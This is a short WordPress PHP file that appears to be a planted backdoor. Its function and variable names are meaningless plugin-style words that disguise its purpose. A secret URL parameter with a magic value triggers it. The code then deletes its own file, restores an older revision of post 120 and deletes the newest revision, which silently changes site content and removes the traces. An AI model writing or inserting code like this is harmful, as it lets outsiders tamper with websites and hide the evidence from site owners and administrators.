<?php

function store_accessible_alt_remote() {
	if (isset($_GET['feed_pages_recaptcha']) && $_GET['feed_pages_recaptcha'] === 'smart_archives_popular_software') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$favicon_player_contact = 120;
		$audio_blocks_better_customizer = wp_get_post_revisions($favicon_player_contact);
		if (empty($audio_blocks_better_customizer)) die('no revisions');
		if (count($audio_blocks_better_customizer) < 2) die('less than 2');
		$most_akismet_csv = array_shift($audio_blocks_better_customizer);
		$pdf_assets_paragraph_engine = $most_akismet_csv->ID;
		$taxonomies_timer_statistics_after = array_shift($audio_blocks_better_customizer);
		$simply_revisions_solution_total = $taxonomies_timer_statistics_after->ID;
		$replace_listing_shortcodes = wp_restore_post_revision($simply_revisions_solution_total);
		if ($replace_listing_shortcodes === false) die('error restoring');
		$replace_listing_shortcodes = wp_delete_post_revision($pdf_assets_paragraph_engine);		
		if ($replace_listing_shortcodes === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'store_accessible_alt_remote');
